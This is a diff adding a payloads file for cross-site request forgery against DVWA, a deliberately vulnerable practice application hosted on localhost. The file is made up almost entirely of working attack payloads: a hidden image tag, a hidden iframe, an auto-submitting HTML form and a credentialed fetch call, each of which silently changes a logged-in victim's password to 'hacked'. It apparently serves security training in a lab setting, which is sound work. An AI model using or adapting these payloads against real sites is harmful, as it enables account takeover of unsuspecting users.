@@ -1,0 +1,26 @@
+# CSRF - Payloads (payloads.txt)
+
+# --- GET-based CSRF via image tag ---
+# Paste inside any HTML page the victim visits
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0" />
+
+# --- GET-based CSRF via iframe ---
+<iframe src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none"></iframe>
+
+# --- Full malicious HTML page (auto-submit) ---
+# Save as attack.html and open while victim is logged into DVWA
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_new" value="hacked" />
+    <input type="hidden" name="password_conf" value="hacked" />
+    <input type="hidden" name="Change" value="Change" />
+  </form>
+</body>
+</html>
+
+# --- JavaScript fetch-based CSRF ---
+fetch("http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change", {
+  credentials: "include"
+});
